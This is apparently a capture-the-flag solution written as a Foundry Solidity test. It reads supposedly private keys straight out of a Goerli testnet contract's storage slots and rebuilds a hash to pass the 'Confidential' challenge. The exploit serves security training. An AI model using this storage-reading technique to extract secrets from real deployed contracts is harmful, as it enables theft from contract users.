// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/Confidential.sol";

contract ConfidentialSolution is Test {

    //Become the owner of the contract
    //Change the value of hacked to true
    //0x01 deployer address
    //0x02 attacker address

    Confidential public target;
    address public goerliDeployment = 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66;
    bytes32 public ALICE_DATA = "QWxpY2UK";
    bytes32 public BOB_DATA = "Qm9iCg";

    function setUp() public {
        //vm.prank(address(0x01));
        target = Confidential(0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66);
        
    }

    function testSolve() public {

        uint256 forkId = vm.createSelectFork(vm.rpcUrl("goerli"));
        bytes32 ALICE_PRIVATE_KEY = vm.load(goerliDeployment, bytes32(uint256(2)));
        bytes32 BOB_PRIVATE_KEY = vm.load(goerliDeployment, bytes32(uint256(7)));

        // emit log_bytes32 (ALICE_PRIVATE_KEY);
        // emit log_bytes32 (BOB_PRIVATE_KEY);

        //reconstruct 

        bytes32 aliceHash = target.hash(ALICE_PRIVATE_KEY, ALICE_DATA);
        bytes32 bobHash = target.hash(BOB_PRIVATE_KEY, BOB_DATA);
        bytes32 combinedHash = target.hash(aliceHash, bobHash);

        assertEq(target.checkthehash(combinedHash), true);
        console.log("success");
    }

}